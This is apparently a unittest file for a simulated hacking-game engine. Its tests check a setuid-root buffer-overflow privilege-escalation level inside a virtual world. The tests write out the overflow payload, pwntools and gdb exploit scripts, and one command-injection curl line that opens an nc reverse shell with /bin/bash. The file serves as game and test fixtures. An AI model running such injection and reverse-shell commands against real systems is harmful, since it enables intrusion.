import unittest

from omnisploit.engine.machine import Process, load_all_levels, p64
from omnisploit.engine.world import World
from omnisploit.shell.shell import Shell


def run(sh, line):
    out = sh.run_line(line)
    o = b"".join(d for d, e in out.chunks if not e)
    e = b"".join(d for d, e in out.chunks if e)
    return o, e


class SuidEngineTests(unittest.TestCase):
    def setUp(self):
        self.lv = load_all_levels()["logsweep"]
        self.payload = b"A" * 72 + p64(self.lv.function("win").addr) + b"\n"

    def test_requires_suid_is_set_on_this_level_only(self):
        self.assertTrue(self.lv.requires_suid)
        self.assertTrue(self.lv.remote_only)
        self.assertFalse(load_all_levels()["motd-daemon"].requires_suid)

    def test_exploit_succeeds_when_suid_is_true(self):
        res = Process(self.lv, suid=True).feed(self.payload)
        self.assertTrue(res.solved)
        self.assertIn(self.lv.flag.encode(), res.stdout)

    def test_exploit_reaches_win_but_does_not_solve_without_suid(self):
        res = Process(self.lv, suid=False).feed(self.payload)
        self.assertFalse(res.solved)
        self.assertNotIn(b"FLAG", res.stdout)

    def test_default_process_is_not_suid(self):
        res = Process(self.lv).feed(self.payload)
        self.assertFalse(res.solved)

    def test_other_levels_are_unaffected_by_the_suid_check(self):
        motd = load_all_levels()["motd-daemon"]
        res = Process(motd, suid=False).feed(b"A" * 72 + p64(motd.function("win").addr) + b"\n")
        self.assertTrue(res.solved)  # requires_suid defaults to False, so it is never gated


class RemoteOnlyPlacementTests(unittest.TestCase):
    def test_not_installed_on_the_players_own_box(self):
        w = World()
        self.assertFalse(w.vfs.exists("/home/player/logsweep"))
        self.assertFalse(w.vfs.exists("/usr/local/bin/logsweep"))

    def test_installed_setuid_root_on_the_intranet_host(self):
        w = World()
        sh = Shell(w)
        run(sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh, "Winter2026!")
        o, _ = run(sh, "ls -l /usr/local/bin/logsweep")
        self.assertIn(b"-rwsr-xr-x", o)
        self.assertIn(b"root", o)
        run(sh, "exit")

    def test_flag_file_is_root_only(self):
        w = World()
        sh = Shell(w)
        run(sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh, "Winter2026!")
        self.assertIn(b"Permission denied", run(sh, "cat /root/root.txt")[1])
        run(sh, "exit")

    def test_find_perm_discovers_it(self):
        w = World()
        sh = Shell(w)
        run(sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh, "Winter2026!")
        o, _ = run(sh, "find / -perm -4000 2>/dev/null")
        self.assertIn(b"/usr/local/bin/logsweep", o)
        run(sh, "exit")


class PrivescEndToEndTests(unittest.TestCase):
    def setUp(self):
        self.w = World()
        self.sh = Shell(self.w)

    def ssh_and_exploit(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        run(self.sh, "python3 -c \"from pwn import *; context.arch='amd64'; "
                     "open('/tmp/p','wb').write(b'A'*72+p64(0x401196)+b'\\n')\"")
        return run(self.sh, "/usr/local/bin/logsweep < /tmp/p")

    def test_checksec_matches_motd(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        o, _ = run(self.sh, "checksec /usr/local/bin/logsweep")
        self.assertIn(b"No canary found", o)
        run(self.sh, "exit")

    def test_full_exploit_over_ssh_prints_the_flag(self):
        o, e = self.ssh_and_exploit()
        self.assertIn(self.w.levels["logsweep"].flag.encode(), o)
        self.assertIn(b"Segmentation fault", e)
        self.assertIn("solved:logsweep", self.w.events)
        run(self.sh, "exit")

    def test_gdb_can_drive_the_exploit_too(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        run(self.sh, "python3 -c \"from pwn import *; context.arch=\'amd64\'; "
                     "open(\'/tmp/p\',\'wb\').write(b\'A\'*72+p64(0x401196)+b\'\\n\')\"")
        run(self.sh, "gdb -q /usr/local/bin/logsweep")
        o, _ = run(self.sh, "run < /tmp/p")
        self.assertIn(self.w.levels["logsweep"].flag.encode(), o)
        run(self.sh, "q")
        run(self.sh, "exit")

    def test_pwn_process_exploit_script(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        o, _ = run(self.sh, "python3 -c \"from pwn import *\ncontext.arch = 'amd64'\n"
                   "p = process('/usr/local/bin/logsweep')\np.sendline(b'A'*72 + p64(0x401196))\n"
                   "out = p.recvall()\nprint(b'FLAG{' in out, p.poll())\"")
        self.assertEqual(o, b"True -11\n")
        run(self.sh, "exit")


class PrivescMissionTests(unittest.TestCase):
    def setUp(self):
        self.w = World()
        self.sh = Shell(self.w)
        run(self.sh, "mkdir ~/workspace")

    def completed(self):
        self.w.missions.evaluate()
        return list(self.w.missions.completed)

    def exploit(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        run(self.sh, "python3 -c \"from pwn import *; context.arch='amd64'; "
                     "open('/tmp/p','wb').write(b'A'*72+p64(0x401196)+b'\\n')\"")
        run(self.sh, "/usr/local/bin/logsweep < /tmp/p")
        run(self.sh, "exit")

    def test_requires_a_shell_the_exploit_and_the_saved_flag(self):
        self.assertEqual(self.completed(), [])
        self.exploit()
        self.assertEqual(self.completed(), [])  # flag not saved yet
        flag = self.w.levels["logsweep"].flag
        run(self.sh, f"echo '{flag}' > ~/workspace/privesc-flag.txt")
        self.assertEqual(self.completed(), ["privesc"])

    def test_revshell_also_counts_as_having_a_shell(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;nc 10.10.0.2 4444 -e /bin/bash'")
        run(self.sh, "fg %1")
        run(self.sh, "python3 -c \"from pwn import *; context.arch='amd64'; "
                     "open('/tmp/p','wb').write(b'A'*72+p64(0x401196)+b'\\n')\"")
        run(self.sh, "/usr/local/bin/logsweep < /tmp/p")
        run(self.sh, "exit")
        flag = self.w.levels["logsweep"].flag
        run(self.sh, f"echo '{flag}' > ~/workspace/privesc-flag.txt")
        self.assertEqual(self.completed(), ["privesc"])

    def test_wrong_flag_text_does_not_complete_it(self):
        self.exploit()
        run(self.sh, "echo 'FLAG{wrong}' > ~/workspace/privesc-flag.txt")
        self.assertEqual(self.completed(), [])

    def test_works_with_a_randomized_flag_seed(self):
        w = World(flag_seed=55)
        sh = Shell(w)
        self.assertNotEqual(w.net.secrets["deploy_pass"], "Winter2026!")
        run(sh, "mkdir ~/workspace")
        run(sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh, w.net.secrets["deploy_pass"])
        run(sh, "python3 -c \"from pwn import *; context.arch='amd64'; "
                "open('/tmp/p','wb').write(b'A'*72+p64(0x401196)+b'\\n')\"")
        run(sh, "/usr/local/bin/logsweep < /tmp/p")
        run(sh, "exit")
        flag = w.levels["logsweep"].flag
        self.assertNotEqual(flag, "FLAG{root_left_a_setuid_present}")  # confirms it really was randomized
        run(sh, f"echo '{flag}' > ~/workspace/privesc-flag.txt")
        w.missions.evaluate()
        self.assertIn("privesc", w.missions.completed)
